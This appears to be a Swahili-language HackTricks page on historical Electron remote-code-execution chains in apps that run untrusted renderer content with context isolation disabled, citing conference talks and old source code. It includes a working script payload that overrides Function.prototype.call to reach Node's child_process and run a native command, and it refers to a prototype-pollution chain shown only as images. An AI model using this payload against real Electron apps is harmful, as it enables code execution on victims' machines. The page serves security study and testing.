# Electron context-isolation RCE kupitia internal code

{{#include ../../banners/hacktricks-training.md}}

Hizi ni **mifumo ya kihistoria ya exploitation** kwa programu za Electron zilizotumia maudhui ya renderer yasiyoaminika bila context isolation. Context isolation imewezeshwa kwa chaguomsingi tangu Electron 12 na bado inapendekezwa kama mpangilio wa usalama.<sup>[[1]](#references)</sup> Maelezo ya ndani hutofautiana kulingana na matoleo ya Electron na Node.js, kwa hivyo rudia chain ukitumia matoleo yaliyofungwa pamoja na programu lengwa.

## Mfano 1: kubadilisha `Function.prototype.call`

Mfano huu umetoka kwenye presentation ya CureCon ya Masato Kinugawa.<sup>[[2]](#references)</sup>

Katika build ya kihistoria ya Electron iliyoathirika, code ya ndani ya ASAR ilisajili listener ya `exit` ya process. Kwa kuwa code ya ukurasa na code ya ndani ya Electron zilitumia prototypes zilezile za JavaScript wakati context isolation ilikuwa imezimwa, code ya renderer ingeweza kubadilisha `Function.prototype.call` kabla listener ya ndani haijatekelezwa.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Electron asar.js njia ya ndani ya msimbo iliyotumika katika mfano wa contextIsolation RCE](<../../images/image (1070).png>)

Listener ilitumwa kupitia mfumo wa matukio wa Node.js. Ukurasa wa awali uliunganisha njia ya zamani ya `bin/events.js`; chanzo hai cha commit hiyo hiyo ya kihistoria kiko chini ya `lib/events.js`.<sup>[[5]](#references)</sup>

![Njia ya msimbo ya Node events.js iliyofikiwa na mnyororo wa Electron contextIsolation RCE](<../../images/image (793).png>)

Katika njia hii, `self` ni kitu cha process cha Node.js:

![Electron contextIsolation RCE kupitia msimbo wa ndani wa Electron - Mfano wa 1: Mahali ambapo "self" ni kitu cha process cha Node](<../../images/image (700).png>)

Kitu cha process cha kihistoria kilifichua njia ya kufikia `require`:

```
process.mainModule.require
```

Kwa kuwa listener dispatcher iliita handler kwa kutumia process object, kubadilisha `call` kungeweza kurejesha object hiyo na kutekeleza native command:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## Mfano wa 2: prototype pollution

Wasilisho la ElectroVolt linaonyesha mnyororo mwingine wa kihistoria unaopata object ya `require` kupitia prototype pollution.<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Hati za Electron - Kutenga muktadha](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Kutumia vibaya ukosefu wa kutenga muktadha - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Msimbo wa kihistoria wa Electron - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: Kumiliki programu maarufu za desktop huku tukigundua maeneo mapya ya mashambulizi kwenye Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Msimbo wa kihistoria wa Node.js - usambazaji wa listener wa `lib/events.js`](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
